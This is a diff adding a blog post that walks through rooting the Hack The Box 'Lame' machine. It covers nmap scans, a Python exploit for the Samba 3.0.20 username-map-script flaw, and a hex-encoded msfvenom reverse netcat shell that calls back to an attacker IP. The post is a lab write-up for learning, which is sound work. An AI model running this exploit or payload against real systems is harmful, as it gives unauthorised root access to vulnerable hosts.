@@ -1,0 +1,223 @@
+---
+title: Hack The Box - Lame (Without Metasploit)
+date: 2021-01-08 17:56:00 +0800
+categories: [hackthebox]
+tags: [linux, samba]
+---
+
+After completing all 66 boxes in the PWK labs, I decided to move on to TJNull's OSCP list of HackTheBoxes which are said to be similar to the ones in the exams. Fortunately the 12 month VIP Lab code which I won from some event was still usable :) 
+
+![](/assets/images/lame.png){:height="414px" width="615px"}
+
+# Configuration
+
+The operating system that I will be using to tackle this machine is a Kali Linux VM.
+
+What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
+
+```bash
+$ echo "10.10.10.3 lame" | sudo tee -a /etc/hosts
+```
+
+# Reconnaissance
+
+```bash
+$ nmap -sT -sV -sC -Pn lame                      
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-08 04:07 EST
+Nmap scan report for lame (10.10.10.3)
+Host is up (0.014s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.7
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h31m20s, deviation: 3h32m08s, median: 1m19s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2021-01-08T04:08:43-05:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 57.60 seconds
+```
+
+# Enumeration
+
+## Port 21 `vsftpd 2.3.4`
+
+Only a few ports to interact with, which is great! Seeing that `vsftpd 2.3.4` is running on port `21`, I instantly remembered of the funny backdoor where sending a `:)` in the username would result in a shell listening on port `6200`. I used `nmap`'s `ftp-vsftpd-backdoor` script and it revealed that the backdoor was no longer there :/
+
+```bash
+$ nmap -Pn --script ftp-vsftpd-backdoor -p 21 lame                   
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-08 04:41 EST
+Nmap scan report for lame (10.10.10.3)
+Host is up (0.015s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+
+Nmap done: 1 IP address (1 host up) scanned in 21.22 seconds
+```
+
+## Port 445 `Samba 3.0.20-Debian`
+
+```bash
+$ searchsploit samba 3.0.20
+--------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                   |  Path
+--------------------------------------------------------------------------------- ---------------------------------
+Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                           | multiple/remote/10095.txt
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb
+...
+```
+
+Using `searchsploit`, we see that there is a `Metasploit` module that targets this version of `samba`. However, I will be attempting the non-Metasploit approach by using this [script](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851) that I found online.
+
+# Exploitation
+
+```python
+#!/usr/bin/python
+
+from smb.SMBConnection import SMBConnection
+import random, string
+from smb import smb_structs
+smb_structs.SUPPORT_SMB2 = False
+import sys
+
+
+# Just a python version of a very simple Samba exploit. 
+# It doesn't have to be pretty because the shellcode is executed
+# in the username field. 
+
+# Based off this Metasploit module - https://www.exploit-db.com/exploits/16320/ 
+
+# Configured SMB connection options with info from here:
+# https://pythonhosted.org/pysmb/api/smb_SMBConnection.html
+
+# Use the commandline argument as the target: 
+if len(sys.argv) < 2:
+    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
+    sys.exit()
+
+
+# Shellcode: 
+# msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.0.35 LPORT=9999 -f python
+
+buf =  ""
+buf += "\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b"
+buf += "\x62\x67\x61\x66\x3b\x20\x6e\x63\x20\x31\x30\x2e\x30"
+buf += "\x2e\x30\x2e\x33\x35\x20\x39\x39\x39\x39\x20\x30\x3c"
+buf += "\x2f\x74\x6d\x70\x2f\x6b\x62\x67\x61\x66\x20\x7c\x20"
+buf += "\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d\x70"
+buf += "\x2f\x6b\x62\x67\x61\x66\x20\x32\x3e\x26\x31\x3b\x20"
+buf += "\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x6b\x62\x67\x61\x66"
+buf += "\x20"
+
+
+username = "/=`nohup " + buf + "`"
+password = ""
+conn = SMBConnection(username, password, "SOMEBODYHACKINGYOU" , "METASPLOITABLE", use_ntlm_v2 = False)
+assert conn.connect(sys.argv[1], 445)
+```
+
+Before running this script, we will need to install the `pysmb` module, which the script requires.
+
+```bash
+$ sudo pip2 install pysmb
+```
+
+Next up, as the script says, we will need to generate our shellcode using `msfvenom`.
+
+```bash
+$ msfvenom -p cmd/unix/reverse_netcat LHOST=tun0 LPORT=9999 -f python
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 92 bytes
+Final size of python file: 467 bytes
+buf =  b""
+buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x61"
+buf += b"\x72\x74\x6d\x6b\x3b\x20\x6e\x63\x20\x31\x30\x2e\x31"
+buf += b"\x30\x2e\x31\x34\x2e\x37\x20\x39\x39\x39\x39\x20\x30"
+buf += b"\x3c\x2f\x74\x6d\x70\x2f\x61\x72\x74\x6d\x6b\x20\x7c"
+buf += b"\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d"
+buf += b"\x70\x2f\x61\x72\x74\x6d\x6b\x20\x32\x3e\x26\x31\x3b"
+buf += b"\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x61\x72\x74\x6d"
+buf += b"\x6b"
+```
+
+After replacing the shellcode in the script with one we generated, we can start our `nc` listener on port `9999` and run the script.
+
+```bash
+$ python samba_usermap_exploit.py lame
+```
+
+```bash
+$ sudo rlwrap nc -vlnp 9999  
+listening on [any] 9999 ...
+connect to [10.10.X.X] from (UNKNOWN) [10.10.10.3] 49921
+whoami
+root
+```
+
+</td>
+</tr>
+</table>
+
+Nice, we instantly got a shell as `root` without having to perform any privilege escalation! Lets try to get a nicer prompt
+
+```bash
+python -c "import pty; pty.spawn('/bin/bash')"
+root@lame:/root#
+```
+
+# user.txt
+
+The user flag is located at `/home/makis`.
+
+```bash
+root@lame:/home/makis# cat cat user.txt
+7b12XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+```
+
+# root.txt
+
+The root flag is located at `/root` as always.
+
+```bash
+root@lame:/root# cat root.txt
+a608XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+```
+
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
